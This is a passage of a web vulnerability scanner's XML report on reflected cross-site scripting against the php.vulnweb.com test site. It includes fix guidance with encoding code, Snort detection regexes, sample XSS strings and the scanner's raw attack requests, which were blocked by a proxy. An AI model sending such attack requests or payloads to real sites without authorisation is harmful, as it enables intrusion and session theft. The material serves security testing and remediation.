</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="0392F644AF4E40AD40F8C7BF357F9610"><![CDATA[GET /pictures/4.jpg.tn/%37%33%33%34%37 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="0392F644AF4E40AD40F8C7BF357F9610";PSID="2911F93E6093F658C9231D0E8F48A053";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2537%2533%2533%2534%2537";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="97135714";
X-Request-Memo: ID="3945d6d5";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3665
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/4.jpg.tn/73347");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:24</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="0392F644AF4E40AD40F8C7BF357F9610"><Method>GET</Method><Path>/pictures/4.jpg.tn/</Path><File>%37%33%33%34%37</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="0392F644AF4E40AD40F8C7BF357F9610";PSID="2911F93E6093F658C9231D0E8F48A053";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2537%2533%2533%2534%2537";AttackStringProps="Attack";tid="40";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="97135714";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="3945d6d5";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/4.jpg.tn/73347");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:24</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3665</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="6DE69E70BF6965A422365150E9861BFF"><URL>http://php.vulnweb.com:80/pictures/3.jpg.tn/%33%35%32%38%34</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="1ad64dba-0a26-41c3-a2a0-f30048803f82"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /pictures/3.jpg.tn/%33%35%32%38%34 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="6DE69E70BF6965A422365150E9861BFF";PSID="E4EA982328348C1381E86C20B52B3C8E";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2533%2535%2532%2538%2534";AttackStringProps="Attack";tid="47";tt="40";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="9969f499";
X-Request-Memo: ID="41ef8f67";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2000" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
